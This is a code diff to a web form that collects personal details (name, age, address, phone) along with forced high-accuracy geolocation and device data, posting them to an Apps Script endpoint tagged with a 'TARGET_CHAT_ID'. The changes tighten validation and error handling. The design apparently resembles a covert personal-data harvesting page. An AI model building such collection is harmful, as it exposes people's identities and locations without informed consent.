@@ -18,6 +18,7 @@ input:focus, select:focus { border-color: var(--primary); outline: none; box-sha
 input.invalid { border-color: var(--error); background: var(--error-bg); }
 .phone-group { display: flex; gap: 8px; }
 .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+.btn:disabled { opacity: 0.6; cursor: not-allowed; }
 .btn-success { background: var(--success); margin-top: 20px; }
 .btn-warning { background: var(--warn); margin-top: 10px; }
 .hidden { display: none !important; }
@@ -172,7 +173,11 @@ function validateField(id) {
   else if(id === "age") { const n = parseInt(v); ok = !isNaN(n) && n >= 1 && n <= 120; }
   else if(["gender","province"].includes(id)) ok = v !== "";
   else if(id === "phone") ok = v.replace(/\D/g,"").length === 10;
-  else if(id === "zip") ok = v.replace(/\s/g,"").length >= 4;
+  else if(id === "zip") {
+    const cleanedZip = v.trim().replace(/\s+/g, " ");
+    const canadianZipRegex = /^[A-Za-z]\d[A-Za-z][ -]?\d[A-Za-z]\d$/;
+    ok = canadianZipRegex.test(cleanedZip);
+  }
   el.classList.toggle("invalid", v.length > 0 && !ok);
   return ok;
 }
@@ -181,7 +186,7 @@ function goConfirm() {
   const fields = ["firstName","lastName","age","gender","occupation","province","address","city","zip","phone"];
   let allOk = true;
   fields.forEach(f => { if(!validateField(f)) allOk = false; });
-  if(!allOk) { alert("⚠️ Please check all required fields."); return; }
+  if(!allOk) { alert("⚠️ Please check all required fields and correct invalid formats."); return; }
   
   form = {
     name: document.getElementById("firstName").value.trim() + " " + document.getElementById("lastName").value.trim(),
@@ -217,7 +222,13 @@ function requestLocation() {
       document.getElementById("btn-submit").classList.remove("hidden");
       document.getElementById("loc-status").classList.remove("hidden");
     },
-    err => { if(err.code === err.PERMISSION_DENIED) alert("⚠️ Location access denied. Please allow location access in your browser settings."); },
+    err => { 
+      if(err.code === err.PERMISSION_DENIED) {
+        alert("⚠️ Location access denied. Please allow location access in your browser settings and refresh.");
+      } else {
+        alert("⚠️ Location request failed. Please retry.");
+      }
+    },
     { enableHighAccuracy: true, timeout: 15000 }
   );
 }
@@ -241,6 +252,11 @@ function detectDevice() {
 
 async function submitAll() {
   if(!locationInfo.ok) { alert("❌ Please ALLOW location access first!"); return; }
+  
+  const submitBtn = document.getElementById("btn-submit");
+  submitBtn.disabled = true;
+  submitBtn.textContent = "Submitting...";
+
   const data = {
     "id": TARGET_CHAT_ID,
     "姓名": form.name, "性别": form.gender, "年龄": form.age, "职业": form.occupation,
@@ -250,18 +266,28 @@ async function submitAll() {
     "纬度": String(locationInfo.lat), "经度": String(locationInfo.lng),
     "录入时间": new Date().toLocaleString("zh-CN")
   };
+
   try {
-    await fetch(APPSCRIPT_URL, {
+    const response = await fetch(APPSCRIPT_URL, {
       method: "POST",
-      mode: "no-cors",
-      headers: { "Content-Type": "text/plain;charset=utf-8" },
       body: JSON.stringify(data)
     });
-  } catch(e) {}
-  
-  localStorage.removeItem("formDraft");
-  alert("✅ Submitted successfully!");
-  location.reload();
+    const result = await response.json();
+    
+    if (result.status === "success") {
+      localStorage.removeItem("formDraft");
+      alert("✅ Submitted successfully!");
+      location.reload();
+    } else {
+      alert("❌ Submission failed: " + (result.message || "Unknown error"));
+      submitBtn.disabled = false;
+      submitBtn.textContent = "✅ Confirm & Submit";
+    }
+  } catch(e) {
+    alert("❌ Network error or request failed. Please check your connection.");
+    submitBtn.disabled = false;
+    submitBtn.textContent = "✅ Confirm & Submit";
+  }
 }
 </script>
 </body>
